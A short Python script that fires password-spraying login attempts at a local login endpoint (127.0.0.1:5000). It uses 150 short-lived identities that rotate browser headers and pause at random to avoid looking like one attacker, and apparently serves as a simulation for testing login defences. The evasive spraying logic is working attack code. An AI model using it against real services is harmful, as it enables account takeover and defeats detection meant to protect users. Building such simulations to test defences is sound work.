import random
import time
from concurrent.futures import ThreadPoolExecutor
import requests

URL = "http://127.0.0.1:5000/login"

FAKE_USERNAMES = [f"user{n}" for n in range(1, 201)] + ["alice", "bob", "carol"]

COMMON_PASSWORDS = [
    "123456", "password", "qwerty", "letmein", "welcome1",
    "admin123", "iloveyou", "abc123", "alice123", "bobpass",
]

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

LANGUAGES = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-IN,en;q=0.9"]


def spread_bot(number):
    """One of many throwaway identities. Only 2 to 3 attempts, then it disappears."""
    headers = {
        "X-Client-ID": f"bot-spread-{number}",
        "User-Agent": random.choice(BROWSERS),
        "Accept-Language": random.choice(LANGUAGES),
    }
    for _ in range(random.randint(2, 3)):
        data = {
            "username": random.choice(FAKE_USERNAMES),
            "password": random.choice(COMMON_PASSWORDS),
        }
        requests.post(URL, data=data, headers=headers)
        time.sleep(random.uniform(3, 10))


# 150 identities, 30 working at the same time
with ThreadPoolExecutor(max_workers=30) as pool:
    pool.map(spread_bot, range(1, 151))

print("Done!")